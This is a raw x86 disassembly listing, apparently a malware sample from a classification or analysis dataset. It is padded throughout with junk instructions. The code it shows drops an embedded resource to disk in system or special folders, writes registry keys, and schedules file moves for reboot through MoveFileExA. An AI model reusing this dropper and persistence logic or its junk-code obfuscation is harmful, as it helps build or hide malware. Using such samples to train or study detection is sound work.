jmp r-xdata
call sub_4066e3
pop ecx
pop ecx
push eax
nop [ eax ] eax
lea eax [ ebp - 0x24 ]
nop [ eax + eax ] eax
push eax
nop
call sub_406430
nop [ eax ] eax
pop ecx
mov edi edi
pop ecx
nop [ eax + eax ] eax
push rw-data
push 0x0
call sub_4066e3
nop [ eax + eax ] eax
pop ecx
nop [ eax + eax ] eax
pop ecx
push eax
nop
lea eax [ ebp - 0x44 ]
push eax
nop [ eax ] eax
call sub_406430
nop [ eax + eax ] eax
pop ecx
pop ecx
nop
push rw-data
push 0x0
call sub_4066e3
nop [ eax + eax ] eax
pop ecx
pop ecx
push eax
nop
lea eax [ ebp - 0x8c8 ]
push eax
call sub_406430
nop
pop ecx
pop ecx
nop
push rw-data
nop [ eax ] eax
push 0x0
nop
call sub_4066e3
nop [ eax ] eax
pop ecx
pop ecx
push eax
jmp r-xdata
lea eax [ ebp - 0x7c8 ]
nop
push eax
nop
call sub_406430
pop ecx
pop ecx
nop
push rw-data
nop [ eax ] eax
push 0x0
nop
call sub_4066e3
nop [ eax ] eax
pop ecx
nop
pop ecx
push eax
lea eax [ ebp - 0x2c4 ]
nop [ eax ] eax
push eax
nop
call sub_406430
pop ecx
jmp r-xdata
pop ecx
push rw-data
push 0x0
call sub_4066e3
jmp r-xdata
pop ecx
pop ecx
nop
push eax
jmp r-xdata
lea eax [ ebp - 0x344 ]
push eax
mov esi esi
call sub_406430
mov eax eax
pop ecx
nop [ eax + eax ] eax
pop ecx
nop
push [ ebp + 0xc ]
nop [ eax ] eax
lea eax [ ebp - 0x24 ]
nop [ eax ] eax
push eax
call sub_406790
nop [ eax + eax ] eax
pop ecx
test eax eax
pop ecx
je r-xdata
mov eax [ ebp - 0x548 ]
inc eax
mov [ ebp - 0x548 ] eax
jmp r-xdata
nop [ eax ] eax
cmp [ ebp + 0x8 ] 0x0
nop [ eax ] eax
je r-xdata
mov eax [ ebp - 0x548 ]
nop
cmp [ eax * 4 + rw-data ] 0x0
je r-xdata
lea eax [ ebp - 0x24 ]
nop
push eax
nop
lea eax [ ebp - 0x2c4 ]
jmp r-xdata
nop [ eax + eax ] eax
lea eax [ ebp - 0x44 ]
jmp r-xdata
push eax
nop
push 0x80000001
nop [ eax ] eax
call sub_40edb0
lea eax [ ebp - 0x24 ]
add esp 0xc
push eax
lea eax [ ebp - 0x8c8 ]
push eax
lea eax [ ebp - 0x748 ]
push eax
push rw-data
lea eax [ ebp - 0x544 ]
push eax
call sub_406520
add esp 0x14
lea eax [ ebp - 0x544 ]
push eax
call sub_40e5f0
pop ecx
test eax eax
je r-xdata
push eax
lea eax [ ebp - 0x648 ]
nop
push eax
nop
push rw-data
lea eax [ ebp - 0x544 ]
nop [ eax ] eax
push eax
call sub_406520
nop [ eax + eax ] eax
lea eax [ ebp - 0x544 ]
nop [ eax ] eax
add esp 0x10
nop
push eax
call sub_40e5f0
nop
test eax eax
nop
pop ecx
push eax
pop eax
je r-xdata
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x8c8 ]
push eax
lea eax [ ebp - 0x748 ]
push eax
push rw-data
lea eax [ ebp - 0x544 ]
push eax
call sub_406520
add esp 0x14
lea eax [ ebp - 0x544 ]
push eax
call sub_40e630
test eax eax
pop ecx
jne r-xdata
jmp r-xdata
mov esi esi
lea eax [ ebp - 0x344 ]
nop [ eax ] eax
push eax
mov edi edi
lea eax [ ebp - 0x648 ]
nop
push eax
push rw-data
nop [ eax + eax ] eax
lea eax [ ebp - 0x544 ]
nop [ eax + eax ] eax
push eax
call sub_406520
nop [ eax + eax ] eax
add esp 0x10
lea eax [ ebp - 0x544 ]
nop
push eax
nop
call sub_40e4d0
nop [ eax ] eax
lea eax [ ebp - 0x24 ]
nop
pop ecx
jmp r-xdata
push 0x4
push 0x0
lea eax [ ebp - 0x544 ]
push eax
call [ MoveFileExA@IAT ]
lea eax [ ebp - 0x544 ]
push eax
call sub_40e4d0
pop ecx
jmp r-xdata
push eax
lea eax [ ebp - 0x2c4 ]
push eax
push 0x80000002
nop [ eax + eax ] eax
call sub_40edb0
nop
movsx eax [ ebp - 0x7c8 ]
jmp r-xdata
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x8c8 ]
push eax
lea eax [ ebp - 0x748 ]
push eax
push rw-data
lea eax [ ebp - 0x544 ]
push eax
call sub_406520
add esp 0x14
lea eax [ ebp - 0x544 ]
push eax
call sub_40e4d0
lea eax [ ebp - 0x344 ]
pop ecx
push eax
lea eax [ ebp - 0x8c8 ]
push eax
lea eax [ ebp - 0x748 ]
push eax
lea eax [ ebp - 0x544 ]
push rw-data
push eax
call sub_406520
lea eax [ ebp - 0x544 ]
add esp 0x14
push eax
call sub_40e4d0
pop ecx
lea eax [ ebp - 0x544 ]
push 0x4
push 0x0
push eax
call [ MoveFileExA@IAT ]
lea eax [ ebp - 0x8c8 ]
push eax
lea eax [ ebp - 0x748 ]
push eax
lea eax [ ebp - 0x544 ]
push rw-data
push eax
call sub_406520
add esp 0x10
lea eax [ ebp - 0x544 ]
push 0x4
push 0x0
push eax
call [ MoveFileExA@IAT ]
mov [ ebp - 0x4 ] 0x1
add esp 0xc
nop [ eax + eax ] eax
cmp eax 0x5c
jne r-xdata
lea eax [ ebp - 0x24 ]
push eax
nop
lea eax [ ebp - 0x648 ]
nop [ eax ] eax
push eax
push rw-data
lea eax [ ebp - 0x544 ]
mov eax eax
push eax
mov esi esi
call sub_406520
jmp r-xdata
nop
lea eax [ ebp - 0x7c8 ]
push eax
nop
lea eax [ ebp - 0x244 ]
push eax
nop
call sub_406430
nop [ eax + eax ] eax
lea eax [ ebp - 0x244 ]
pop ecx
nop [ eax ] eax
pop ecx
nop [ eax ] eax
push rw-data
push esp
pop esp
push eax
call sub_4066e3
nop
pop ecx
pop ecx
nop
push eax
nop
lea eax [ ebp - 0x444 ]
nop
push eax
jmp r-xdata
add esp 0x10
lea eax [ ebp - 0x544 ]
nop
push eax
nop [ eax ] eax
call sub_40e4d0
pop ecx
nop [ eax ] eax
lea eax [ ebp - 0x44 ]
nop
push eax
lea eax [ ebp - 0x648 ]
nop
push eax
push rw-data
nop [ eax + eax ] eax
lea eax [ ebp - 0x544 ]
nop [ eax ] eax
push eax
call sub_406520
add esp 0x10
lea eax [ ebp - 0x544 ]
nop [ eax ] eax
push eax
nop [ eax + eax ] eax
call sub_40e630
nop
test eax eax
pop ecx
je r-xdata
call sub_406430
push ebx
pop ebx
lea eax [ ebp - 0x444 ]
nop [ eax + eax ] eax
pop ecx
nop
pop ecx
nop [ eax + eax ] eax
push eax
jmp r-xdata
lea eax [ ebp - 0x544 ]
nop
push eax
jmp r-xdata
jmp r-xdata
lea eax [ ebp - 0x648 ]
nop [ eax + eax ] eax
push eax
push rw-data
jmp r-xdata
call sub_40e4d0
nop
pop ecx
nop
lea eax [ ebp - 0x544 ]
push esp
pop esp
push 0x4
jmp r-xdata
lea eax [ ebp - 0x544 ]
nop
push eax
nop
call sub_406520
nop [ eax ] eax
lea eax [ ebp - 0x544 ]
jmp r-xdata
push eax
nop [ eax + eax ] eax
call sub_40e4d0
nop
pop ecx
nop [ eax + eax ] eax
push 0x0
push eax
mov edx edx
call [ MoveFileExA@IAT ]
mov [ ebp - 0x4 ] 0x1
nop [ eax ] eax
jmp r-xdata
add esp 0x10
nop
push eax
nop
call sub_40e5e0
nop [ eax ] eax
pop ecx
nop [ eax + eax ] eax
jmp r-xdata
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x648 ]
nop
push eax
nop [ eax ] eax
lea eax [ ebp - 0x544 ]
nop [ eax ] eax
push rw-data
push eax
call sub_406520
nop
lea eax [ ebp - 0x544 ]
nop [ eax ] eax
add esp 0x10
jmp r-xdata
sub_40302c
push ebp
mov ebp esp
sub esp 0x248
push ebx
push esi
push edi
and [ ebp - 0x244 ] 0x0
nop
and [ ebp - 0x244 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x248 ] eax
jmp r-xdata
cmp [ ebp - 0x248 ] 0x0
nop
je r-xdata
mov eax [ ebp - 0x244 ]
cmp [ eax * 4 + rw-data ] 0x0
nop [ eax ] eax
je r-xdata
cmp [ ebp - 0x248 ] 0x1
jmp r-xdata
jmp r-xdata
xchg eax edi
mov edi [ ebp - 0x244 ]
xchg edi eax
nop
push [ eax * 4 + rw-data ]
xchg eax esi
lea esi [ ebp - 0x200 ]
xchg eax esi
push eax
nop [ eax ] eax
call sub_40e8d0
pop ecx
lea eax [ ebp - 0x200 ]
nop
pop ecx
push rw-data
push eax
jmp r-xdata
je r-xdata
or eax 0xffffffff
nop [ eax ] eax
jmp r-xdata
call sub_4066e3
pop ecx
nop
pop ecx
push eax
nop [ eax + eax ] eax
lea eax [ ebp - 0x240 ]
push eax
nop [ eax + eax ] eax
call sub_406430
nop
pop ecx
pop ecx
jmp r-xdata
mov eax [ ebp - 0x244 ]
push eax
pop eax
cmp [ eax * 4 + rw-data ] 0x0
nop
je r-xdata
nop
cmp [ ebp - 0x248 ] 0x2
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x240 ]
push eax
nop [ eax ] eax
push [ ebp + 0xc ]
nop [ eax + eax ] eax
call sub_40cbf0
nop
pop ecx
test eax eax
jmp r-xdata
jmp r-xdata
nop
mov eax [ ebp - 0x244 ]
nop [ eax ] eax
push [ eax * 4 + rw-data ]
lea eax [ ebp - 0x200 ]
push eax
nop [ eax ] eax
call sub_40e8d0
nop
pop ecx
nop
lea eax [ ebp - 0x200 ]
pop ecx
nop [ eax + eax ] eax
push rw-data
nop
push eax
mov edi edi
call sub_4066e3
jmp r-xdata
mov eax [ ebp - 0x244 ]
nop [ eax + eax ] eax
cmp [ eax * 4 + rw-data ] 0x0
nop [ eax ] eax
je r-xdata
jmp r-xdata
pop ecx
jne r-xdata
pop ecx
pop ecx
nop
push rw-data
push 0x0
push ecx
pop ecx
call sub_4066e3
pop ecx
mov eax eax
pop ecx
nop
push eax
nop [ eax ] eax
lea eax [ ebp - 0x240 ]
push edx
pop edx
push eax
nop [ eax ] eax
call sub_406430
nop
pop ecx
nop
pop ecx
xchg edx eax
lea edx [ ebp - 0x240 ]
xchg edx eax
push eax
nop [ eax + eax ] eax
push [ ebp + 0xc ]
nop
call sub_40cbf0
nop [ eax ] eax
test eax eax
push edx
pop edx
pop ecx
nop [ eax ] eax
pop ecx
jne r-xdata
nop [ eax ] eax
xchg esi eax
mov esi [ ebp - 0x244 ]
xchg eax esi
push [ eax * 4 + rw-data ]
nop [ eax ] eax
lea eax [ ebp - 0x200 ]
push eax
nop [ eax + eax ] eax
call sub_40e8d0
mov esi esi
pop ecx
jmp r-xdata
mov eax [ ebp - 0x244 ]
nop [ eax ] eax
inc eax
jmp r-xdata
nop [ eax + eax ] eax
mov eax [ ebp - 0x244 ]
mov esp esp
push [ eax * 4 + rw-data ]
nop [ eax ] eax
push [ ebp + 0x10 ]
push eax
pop eax
call sub_406430
mov eax 0x0
pop ecx
mov ebp ebp
pop ecx
jmp r-xdata
mov eax [ ebp - 0x244 ]
inc eax
mov [ ebp - 0x244 ] eax
nop [ eax ] eax
jmp r-xdata
mov eax [ ebp - 0x244 ]
nop [ eax ] eax
push [ eax * 4 + rw-data ]
push [ ebp + 0x10 ]
nop
call sub_406430
nop
mov eax 0x0
nop [ eax ] eax
pop ecx
nop [ eax ] eax
pop ecx
nop
jmp r-xdata
lea eax [ ebp - 0x200 ]
pop ecx
nop [ eax ] eax
push rw-data
nop [ eax ] eax
push eax
nop [ eax ] eax
call sub_4066e3
pop ecx
mov edi edi
pop ecx
push eax
nop [ eax ] eax
lea eax [ ebp - 0x240 ]
nop
push eax
call sub_406430
pop ecx
nop
xchg edx eax
lea edx [ ebp - 0x240 ]
xchg eax edx
pop ecx
nop [ eax + eax ] eax
push eax
nop [ eax ] eax
push [ ebp + 0xc ]
nop [ eax ] eax
call sub_40cbf0
xchg eax ebx
test ebx ebx
xchg eax ebx
mov esp esp
pop ecx
nop
pop ecx
push edi
pop edi
jne r-xdata
mov [ ebp - 0x244 ] eax
nop [ eax ] eax
jmp r-xdata
mov eax [ ebp - 0x244 ]
nop [ eax + eax ] eax
inc eax
mov [ ebp - 0x244 ] eax
mov ecx ecx
jmp r-xdata
mov esp esp
mov eax [ ebp - 0x244 ]
nop [ eax ] eax
push [ eax * 4 + rw-data ]
nop
push [ ebp + 0x10 ]
call sub_406430
mov eax 0x0
pop ecx
nop [ eax ] eax
pop ecx
nop [ eax ] eax
jmp r-xdata
sub_403394
sub [ ecx + 0xef558d8 ] dl
fldenv [ esi ]
dec eax
pushfd
dec ebp
mov [ ecx + 0x6ba352c ] eax
push ebp
scasd [ edi ]
in al dx
inc edx
add al 0x10
nop
fbld [ ebp + 0x45 ]
0xd36a1341 0x7d45
sub_403456
popad
sub ecx ebx
das
jb r-xdata
0x44f4de9d 0x240
xor eax 0x6e77390d
out dx eax
pop es
into
shr [ esi - 0x5e ] 0xc3
push 0x3a
lodsd [ esi ]
les ebp [ ecx ]
xor esp [ ebx ]
sbb [ ebx + 0xf4bf15f ] esp
jge r-xdata
rcl [ edi + 0x5b5e5f98 ] 0xc9
retn
outsb
inc edi
lodsb [ esi ]
int1
mov edx 0x2677c3d3
cmp al 0xdc
lea eax [ edi - 0x72 ]
jle r-xdata
xchg ecx eax
fcomp [ eax - 0xb ]
push cs
fldenv [ esi ]
dec eax
pushfd
dec ebp
mov [ ecx + 0x6ba352c ] eax
push ebp
scasd [ edi ]
in al dx
inc edx
add al 0x10
nop
fbld [ ebp + 0x45 ]
0xd36a1341 0x7d45
cmpsb [ esi ] [ edi ]
sub al 0x3
lahf
jge r-xdata
hlt
fmul st7
int 0xfc
mov ebx 0x3340bc8d
adc dh [ edx ]
dec ebp
dec edi
mov esi 0xc6a1dbb6
test [ esi + 0x7c ] ah
sbb eax 0xa66cb7f1
add dh [ edx + 0x604a9af4 ]
sub_403464
push ebp
mov ebp esp
sub esp 0xb0c
push ebx
push esi
push edi
mov eax 0x0
nop [ eax ] eax
and [ ebp - 0x400 ] 0x0
mov ecx 0xff
jmp r-xdata
lea edi [ ebp - 0x3ff ]
nop [ eax ] eax
push 0x0
[ edi ]
nop
and [ ebp - 0x804 ] 0x0
nop
stosw [ edi ]
nop [ eax + eax ] eax
stosb [ edi ]
nop [ eax ] eax
mov ecx 0xff
mov eax 0x0
mov ebp ebp
lea edi [ ebp - 0x803 ]
and [ ebp - 0xa08 ] 0x0
nop
[ edi ]
jmp r-xdata
and [ ebp - 0xa0c ] 0x0
nop [ eax ] eax
stosw [ edi ]
nop [ eax ] eax
stosb [ edi ]
and [ ebp - 0x404 ] 0x0
nop [ eax + eax ] eax
call sub_406607
pop ecx
push eax
jmp r-xdata
call sub_4065d8
nop [ eax ] eax
mov [ ebp - 0x404 ] 0x8
nop [ eax ] eax
pop ecx
call sub_4065e5
nop [ eax + eax ] eax
cdq
idiv [ ebp - 0x404 ]
nop
mov [ ebp - 0xa0c ] edx
mov eax [ ebp - 0xa0c ]
nop
push [ eax * 4 + rw-data ]
nop
lea eax [ ebp - 0x804 ]
mov edx edx
push eax
nop
call sub_406430
nop [ eax + eax ] eax
pop ecx
xchg ecx eax
lea ecx [ ebp - 0x804 ]
xchg ecx eax
pop ecx
nop [ eax ] eax
push eax
nop
lea eax [ ebp - 0x400 ]
push eax
nop [ eax ] eax
call sub_40e8d0
mov esp esp
pop ecx
nop [ eax + eax ] eax
xchg eax ecx
lea ecx [ ebp - 0x400 ]
xchg ecx eax
nop
pop ecx
push eax
lea eax [ ebp - 0x804 ]
nop
push eax
jmp r-xdata
call sub_406430
nop [ eax + eax ] eax
cmp [ ebp + 0x8 ] 0x0
pop ecx
nop [ eax ] eax
pop ecx
jmp r-xdata
je r-xdata
push 0x0
push 0x1a
nop [ eax ] eax
lea eax [ ebp - 0xb0c ]
push eax
jmp r-xdata
push esi
pop esi
push 0x100
nop [ eax + eax ] eax
lea eax [ ebp - 0xb0c ]
nop [ eax ] eax
push eax
call [ GetSystemDirectoryA@IAT ]
nop [ eax ] eax
push rw-data
nop [ eax ] eax
lea eax [ ebp - 0x804 ]
nop [ eax ] eax
push eax
call sub_4066e3
nop [ eax + eax ] eax
pop ecx
pop ecx
push eax
push [ ebp + 0x10 ]
nop [ eax ] eax
call sub_406430
nop [ eax + eax ] eax
pop ecx
pop ecx
push rw-data
jmp r-xdata
push 0x0
mov eax eax
call [ SHGetSpecialFolderPathA@IAT ]
nop [ eax ] eax
lea eax [ ebp - 0x804 ]
nop
push rw-data
nop
push eax
nop
call sub_4066e3
jmp r-xdata
push 0x0
nop [ eax ] eax
call sub_4066e3
nop [ eax ] eax
pop ecx
pop ecx
mov ebp ebp
push eax
push [ ebp + 0x14 ]
jmp r-xdata
pop ecx
pop ecx
push eax
push [ ebp + 0x10 ]
call sub_406430
pop ecx
nop [ eax ] eax
pop ecx
nop [ eax ] eax
push rw-data
nop
push 0x0
call sub_4066e3
nop [ eax ] eax
pop ecx
nop
pop ecx
nop
push eax
nop [ eax ] eax
push [ ebp + 0x14 ]
nop
call sub_406430
nop
pop ecx
pop ecx
push esi
pop esi
push rw-data
nop [ eax ] eax
push 0x0
xchg esi ecx
mov esi esi
xchg ecx esi
call sub_4066e3
pop ecx
nop
pop ecx
mov ebx ebx
push eax
xchg eax ebx
lea ebx [ ebp - 0xa04 ]
xchg ebx eax
push eax
nop [ eax ] eax
call sub_406430
push esp
pop esp
movsx eax [ ebp - 0xa04 ]
nop
pop ecx
pop ecx
push esp
pop esp
cmp eax 0x5c
nop [ eax ] eax
jne r-xdata
call sub_406430
jmp r-xdata
lea eax [ ebp - 0xa04 ]
mov edx edx
push eax
push [ ebp + 0xc ]
nop [ eax ] eax
call sub_406430
pop ecx
mov esp esp
pop ecx
nop
nop [ eax ] eax
lea eax [ ebp - 0xa04 ]
nop [ eax ] eax
push eax
nop [ eax + eax ] eax
lea eax [ ebp - 0xb0c ]
push eax
pop eax
push eax
nop
push rw-data
push [ ebp + 0xc ]
call sub_406520
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
nop [ eax ] eax
jmp r-xdata
pop ecx
mov ebx ebx
pop ecx
mov edx edx
push rw-data
mov ebx ebx
push 0x0
nop
call sub_4066e3
nop [ eax + eax ] eax
pop ecx
pop ecx
nop [ eax + eax ] eax
push rw-data
nop [ eax ] eax
push 0x0
call sub_4066e3
nop
pop ecx
pop ecx
mov eax eax
push eax
nop [ eax ] eax
lea eax [ ebp - 0xa04 ]
push eax
nop [ eax + eax ] eax
call sub_406430
movsx eax [ ebp - 0xa04 ]
nop [ eax + eax ] eax
cmp eax 0x5c
nop
pop ecx
pop ecx
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
push rw-data
nop
push 0x0
nop
call sub_4066e3
pop ecx
nop
pop ecx
push rw-data
nop
push 0x0
nop [ eax + eax ] eax
call sub_4066e3
mov eax eax
pop ecx
nop [ eax + eax ] eax
pop ecx
push rw-data
push 0x0
call sub_4066e3
nop
pop ecx
pop ecx
push eax
push [ ebp + 0x18 ]
call sub_406430
pop ecx
push ebp
pop ebp
pop ecx
nop
lea eax [ ebp - 0xb0c ]
push eax
push [ ebp + 0xc ]
nop [ eax ] eax
call sub_406430
nop [ eax + eax ] eax
pop ecx
nop [ eax + eax ] eax
pop ecx
nop [ eax ] eax
lea eax [ ebp - 0xa04 ]
nop [ eax ] eax
push eax
lea eax [ ebp - 0xb0c ]
push eax
push rw-data
push [ ebp + 0xc ]
nop [ eax ] eax
call sub_406520
nop [ eax ] eax
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
jmp r-xdata
push rw-data
nop [ eax ] eax
push 0x0
nop [ eax ] eax
call sub_4066e3
nop [ eax ] eax
pop ecx
mov ebp ebp
pop ecx
nop [ eax + eax ] eax
push eax
nop [ eax ] eax
push [ ebp + 0x18 ]
nop
call sub_406430
nop [ eax ] eax
pop ecx
nop [ eax ] eax
pop ecx
jmp r-xdata
jmp r-xdata
mov eax 0x0
jmp r-xdata
push rw-data
push 0x0
nop
call sub_4066e3
pop ecx
nop [ eax ] eax
pop ecx
jmp r-xdata
sub_4038f9
push ebp
mov ebp esp
sub esp 0x704
push ebx
push esi
push edi
lea eax [ ebp - 0x404 ]
push eax
nop [ eax ] eax
push [ ebp + 0x10 ]
nop
push 0x2
nop
call sub_40302c
nop [ eax + eax ] eax
add esp 0xc
test eax eax
jge r-xdata
lea eax [ ebp - 0x404 ]
nop
push eax
mov eax eax
xchg esi eax
lea esi [ ebp - 0x200 ]
xchg eax esi
nop [ eax ] eax
push eax
call sub_40e8d0
pop ecx
lea eax [ ebp - 0x200 ]
nop [ eax ] eax
pop ecx
nop [ eax ] eax
push rw-data
push eax
call sub_4066e3
pop ecx
nop [ eax ] eax
mov [ ebp - 0x204 ] eax
nop
cmp [ ebp - 0x204 ] 0x0
nop [ eax + eax ] eax
pop ecx
nop
jne r-xdata
nop [ eax + eax ] eax
mov eax 0x0
jmp r-xdata
push rw-data
mov esp esp
push 0x0
nop
call sub_4066e3
nop
pop ecx
pop ecx
nop
push eax
nop
push rw-data
xchg esi eax
lea esi [ ebp - 0x704 ]
xchg eax esi
nop [ eax ] eax
push eax
call sub_406520
nop
xchg eax esi
lea esi [ ebp - 0x704 ]
xchg esi eax
mov ebp ebp
add esp 0x6
add esp 0x6
jmp r-xdata
mov eax 0x0
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
push 0x0
nop
push eax
nop [ eax ] eax
call sub_40f750
nop [ eax ] eax
test eax eax
mov ecx ecx
pop ecx
pop ecx
nop [ eax + eax ] eax
jne r-xdata
push 0x0
nop [ eax ] eax
lea eax [ ebp - 0x704 ]
push esi
pop esi
push eax
nop
call sub_40f9a0
nop [ eax + eax ] eax
pop ecx
nop [ eax ] eax
pop ecx
mov esi esi
mov eax eax
push [ ebp + 0x10 ]
jmp r-xdata
push [ ebp + 0xc ]
push esp
pop esp
lea eax [ ebp - 0x604 ]
push rw-data
nop
push eax
nop
call sub_406520
add esp 0x3
add esp 0x5
add esp 0x8
cmp [ ebp + 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0x404 ]
nop [ eax + eax ] eax
push eax
nop [ eax + eax ] eax
push [ ebp + 0x10 ]
push 0x0
call sub_40302c
nop [ eax ] eax
add esp 0x5
add esp 0x3
add esp 0x4
jmp r-xdata
nop
push 0x0
xchg eax ecx
lea ecx [ ebp - 0x604 ]
xchg eax ecx
nop [ eax + eax ] eax
push eax
nop [ eax + eax ] eax
lea eax [ ebp - 0x704 ]
mov ebp ebp
push eax
nop [ eax ] eax
call sub_40f7d0
push ebx
pop ebx
lea eax [ ebp - 0x704 ]
nop
add esp 0xc
nop
push 0x0
push eax
nop [ eax ] eax
call sub_40f750
pop ecx
nop
test eax eax
nop
pop ecx
jmp r-xdata
test eax eax
nop [ eax ] eax
jge r-xdata
jne r-xdata
lea eax [ ebp - 0x404 ]
push eax
nop [ eax + eax ] eax
lea eax [ ebp - 0x200 ]
push eax
call sub_40e8d0
nop [ eax ] eax
pop ecx
xchg eax ecx
lea ecx [ ebp - 0x200 ]
xchg eax ecx
nop [ eax ] eax
pop ecx
nop [ eax ] eax
push rw-data
push eax
push ecx
pop ecx
call sub_4066e3
nop [ eax ] eax
pop ecx
nop
pop ecx
nop
push rw-data
nop [ eax ] eax
push 0x0
call sub_4066e3
pop ecx
push ecx
pop ecx
pop ecx
jmp r-xdata
nop [ eax ] eax
mov eax 0x0
nop
jmp r-xdata
jmp r-xdata
nop [ eax + eax ] eax
mov eax 0x0
nop
jmp r-xdata
push rw-data
nop
push 0x0
nop [ eax + eax ] eax
call sub_4066e3
mov esi esi
pop ecx
nop
pop ecx
nop [ eax ] eax
push rw-data
nop [ eax + eax ] eax
push 0x0
nop
call sub_4066e3
pop ecx
pop ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
nop [ eax ] eax
lea eax [ ebp - 0x604 ]
nop
push rw-data
push esi
pop esi
push eax
push edi
pop edi
call sub_406520
nop
add esp 0x3
add esp 0x2
add esp 0x3
add esp 0x8
cmp [ ebp + 0x14 ] 0x0
mov ebp ebp
je r-xdata
jmp r-xdata
push rw-data
nop [ eax + eax ] eax
push 0x0
call sub_4066e3
nop [ eax ] eax
pop ecx
nop [ eax ] eax
pop ecx
nop [ eax + eax ] eax
push eax
lea eax [ ebp - 0x704 ]
nop [ eax ] eax
push eax
call sub_406430
nop [ eax ] eax
pop ecx
push eax
pop eax
pop ecx
nop
lea eax [ ebp - 0x604 ]
push eax
push [ ebp + 0x10 ]
nop [ eax + eax ] eax
lea eax [ ebp - 0x704 ]
push eax
nop
push 0x80000001
mov ebp ebp
call sub_40eb70
nop
inc esp
add esp 0xf
lea eax [ ebp - 0x200 ]
push 0x100
nop
push eax
nop [ eax ] eax
push [ ebp + 0x10 ]
nop
lea eax [ ebp - 0x704 ]
push eax
nop [ eax ] eax
push 0x80000001
nop
call sub_40eb00
nop [ eax ] eax
add esp 0x4
add esp 0x1
add esp 0x5
add esp 0x5
add esp 0x3
add esp 0x2
push eax
pop eax
test eax eax
nop [ eax + eax ] eax
jne r-xdata
nop [ eax ] eax
lea eax [ ebp - 0x604 ]
nop
push 0x0
nop [ eax ] eax
push eax
nop
push [ ebp + 0x10 ]
call sub_40f550
add esp 0xc
jmp r-xdata
push 0x1
nop [ eax + eax ] eax
pop eax
nop
jmp r-xdata
mov edx edx
lea eax [ ebp - 0x604 ]
nop [ eax ] eax
push 0x0
push eax
nop [ eax + eax ] eax
push [ ebp + 0x10 ]
call sub_40f550
nop
xor eax eax
nop
add esp 0xc
nop [ eax + eax ] eax
jmp r-xdata
test eax eax
nop [ eax + eax ] eax
jne r-xdata
jmp r-xdata
nop
push 0x1
pop eax
nop [ eax ] eax
jmp r-xdata
sub_403d4a
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
push [ ebp + 0x8 ]
movzx eax [ ebp + 0xc ]
nop [ eax ] eax
push eax
nop [ eax ] eax
push 0x0
nop [ eax ] eax
call [ FindResourceA@IAT ]
nop
mov [ ebp - 0x10 ] eax
nop [ eax ] eax
cmp [ ebp - 0x10 ] 0x0
mov esp esp
jne r-xdata
push [ ebp - 0x10 ]
push 0x0
nop [ eax ] eax
call [ LoadResource@IAT ]
nop [ eax + eax ] eax
mov [ ebp - 0x8 ] eax
nop
cmp [ ebp - 0x8 ] 0x0
nop [ eax ] eax
jne r-xdata
mov eax 0x0
jmp r-xdata
push [ ebp - 0x10 ]
nop [ eax ] eax
push 0x0
nop [ eax ] eax
call [ SizeofResource@IAT ]
push esp
pop esp
mov [ ebp - 0x4 ] eax
push edx
pop edx
push [ ebp - 0x8 ]
call [ LockResource@IAT ]
nop
mov [ ebp - 0xc ] eax
nop
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov edx edx
mov eax 0x0
nop [ eax ] eax
jmp r-xdata
jmp r-xdata
push [ ebp + 0x14 ]
mov edi edi
call sub_40e5f0
nop [ eax + eax ] eax
pop ecx
test eax eax
jne r-xdata
mov eax 0x0
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
push 0x0
nop
push 0x0
push 0x2
push 0x0
nop
push 0x0
jmp r-xdata
push [ ebp + 0x14 ]
nop
call sub_40e4e0
nop [ eax + eax ] eax
pop ecx
push 0x1f01ff
nop [ eax ] eax
push [ ebp + 0x10 ]
call [ CreateFileA@IAT ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0xffffffff
nop
jne r-xdata
push 0x0
xchg esi eax
lea esi [ ebp - 0x18 ]
xchg eax esi
nop [ eax ] eax
push eax
nop [ eax ] eax
push [ ebp - 0x4 ]
push [ ebp - 0xc ]
nop [ eax + eax ] eax
push [ ebp - 0x14 ]
nop
call [ WriteFile@IAT ]
nop
push [ ebp - 0x14 ]
call [ CloseHandle@IAT ]
nop [ eax ] eax
push 0x1
nop [ eax ] eax
pop eax
mov ecx ecx
jmp r-xdata
nop
mov eax 0x0
nop [ eax ] eax
jmp r-xdata
sub_404024
push ebp
mov ebp esp
sub esp 0x43c
push ebx
push esi
push edi
push rw-data
and [ ebp - 0x1c ] 0x0
and [ ebp - 0x20 ] 0x0
mov esi esi
or [ ebp - 0x30 ] 0xffffffff
nop [ eax ] eax
mov [ ebp - 0x28 ] 0xaaaa
mov [ ebp - 0x24 ] 0x77778888
mov [ ebp - 0x2c ] 0x11223344
jmp r-xdata
push [ ebp + 0x8 ]
nop
call sub_406ad6
nop [ eax + eax ] eax
mov [ ebp - 0x43c ] eax
nop
pop ecx
cmp [ ebp - 0x43c ] 0x0
nop [ eax + eax ] eax
pop ecx
nop
jne r-xdata
and [ ebp - 0x20 ] 0x0
nop
jmp r-xdata
or eax 0xffffffff
push esi
pop esi
jmp r-xdata
movsx eax [ ebp - 0x20 ]
nop
cmp eax 0x4
jge r-xdata
pop edi
pop esi
pop ebx
leave
retn
push 0x0
push [ ebp - 0x1c ]
push [ ebp - 0x43c ]
nop [ eax ] eax
call sub_4069ec
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
nop
push [ ebp - 0x43c ]
nop
push 0x400
nop [ eax ] eax
lea eax [ ebp - 0x438 ]
nop [ eax ] eax
push 0x1
nop
push eax
nop
call sub_4068d5
mov [ ebp - 0x34 ] eax
nop
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
